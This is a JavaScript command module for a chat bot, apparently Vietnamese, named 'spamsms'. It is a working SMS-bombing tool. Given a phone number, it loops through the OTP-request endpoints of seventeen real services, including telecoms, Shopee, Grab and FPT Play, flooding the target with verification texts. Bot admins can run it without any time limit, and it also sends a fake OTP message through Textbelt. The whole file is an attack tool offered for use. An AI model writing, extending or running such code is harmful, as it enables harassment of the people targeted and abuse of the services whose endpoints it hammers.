const axios = require('axios');

module.exports.config = {
    name: "spamsms",
    version: "1.1.2",
    hasPermission: 1,
    credits: "vanhung",
    description: "Spam SMS OTP",
    commandCategory: "Tiện ích",
    usages: "spamsms {sdt}",
    cooldowns: 5
};

const adminIDs = ["100000895922054", "100000895922054"]; // Thay bằng ID admin bot

module.exports.run = async function ({ api, event, args }) {
    const { threadID, messageID, senderID } = event;

    if (args.length < 1) {
        return api.sendMessage("❌ Vui lòng nhập số điện thoại!", threadID, messageID);
    }

    const sdt = args[0];
    let time = adminIDs.includes(senderID) ? Infinity : 60;

    if (!/^\d{10}$/.test(sdt)) {
        return api.sendMessage("❌ Số điện thoại không hợp lệ, vui lòng nhập 10 số!", threadID, messageID);
    }

    api.sendMessage(`🔄 Đang gửi OTP đến ${sdt}...`, threadID, messageID);
    await sendOtpLoop(sdt, time, threadID, api);
    api.sendMessage(`✅ Hoàn thành gửi OTP đến ${sdt}!`, threadID, messageID);
};

const apis = [
  { name: 'vietloan', url: 'https://vietloan.vn/register/phone-resend', method: 'post', data: (phone) => ({ phone, _token: 'XPEgEGJyFjeAr4r2LbqtwHcTPzu8EDNPB5jykdyi' }), headers: { 'Cookie': '__cfruid=05dded470380675f852d37a751c7becbfec7f394-1722345991; XSRF-TOKEN=valid-token; sessionid=valid-sessionid' } },
  { name: 'viettel', url: 'https://viettel.vn/api/get-otp', method: 'post', data: (phone) => ({ msisdn: phone }), headers: { 'X-CSRF-TOKEN': 'valid-token-here' } },
  { name: 'medicare', url: 'https://api.medicare.com.vn/auth/send-otp', method: 'post', data: (phone) => ({ phone }) },
  { name: 'tv360', url: 'https://m.tv360.vn/public/v1/auth/get-otp-login', method: 'post', data: (phone) => ({ msisdn: phone }) },
  { name: 'dienmayxanh', url: 'https://www.dienmayxanh.com/api/SendOtp', method: 'post', data: (phone) => ({ phoneNumber: phone }) },
  { name: 'shopee', url: 'https://shopee.vn/api/v2/authentication/request_otp', method: 'post', data: (phone) => ({ phone }) },
  { name: 'thegioididong', url: 'https://www.thegioididong.com/api/SendOtp', method: 'post', data: (phone) => ({ phoneNumber: phone }) },
  { name: 'textbelt', url: 'https://textbelt.com/text', method: 'post', data: (phone) => ({ phone, message: 'Your OTP code is 123456', key: 'textbelt' }) },
  { name: 'mobifone', url: 'https://mobifone.vn/api/auth/request-otp', method: 'post', data: (phone) => ({ phone }) },
  { name: 'vinaphone', url: 'https://vinaphone.com.vn/api/auth/request-otp', method: 'post', data: (phone) => ({ phone }) },
  { name: 'grab', url: 'https://api.grab.com/grabid/v1/phone/otp', method: 'post', data: (phone) => ({ phone }) },
  { name: 'kingfoodmart', url: 'https://kingfoodmart.com/api/authentication/request-otp', method: 'post', data: (phone) => ({ phone }) },
  { name: 'mocha', url: 'https://apivideo.mocha.com.vn/onMediaBackendBiz/mochavideo/getOtp', method: 'post', data: (phone) => ({ msisdn: phone, languageCode: 'vi' }) },
  { name: 'fptplay_register', url: 'https://fptplay.vn/api/register/otp', method: 'post', data: (phone) => ({ phone }) },
  { name: 'fptplay_forgot', url: 'https://fptplay.vn/api/auth/password/forgot', method: 'post', data: (phone) => ({ phone }) },
  { name: 'vieon', url: 'https://vieon.vn/api/v1/user/otp/send', method: 'post', data: (phone) => ({ phone }) },
  { name: 'ghn', url: 'https://online-gateway.ghn.vn/sso/public-api/v2/client/sendotp', method: 'post', data: (phone) => ({ phone }) }
];

const sendOtpLoop = async (phone, duration, threadID, api) => {
    const startTime = Date.now();
    while (Date.now() - startTime < duration * 2000) {
        for (const apiInfo of apis) {
            try {
                await axios({
                    method: apiInfo.method,
                    url: apiInfo.url,
                    data: apiInfo.data ? apiInfo.data(phone) : undefined,
                    params: apiInfo.params ? apiInfo.params(phone) : undefined,
                    headers: apiInfo.headers ? apiInfo.headers : undefined
                });
                console.log(`${apiInfo.name}: OTP sent successfully!`);
            } catch (error) {
                console.log(`${apiInfo.name}: Failed to send OTP.`, error.response?.data || error.message);
            }
        }
        await new Promise(resolve => setTimeout(resolve, 6000));
    }
};

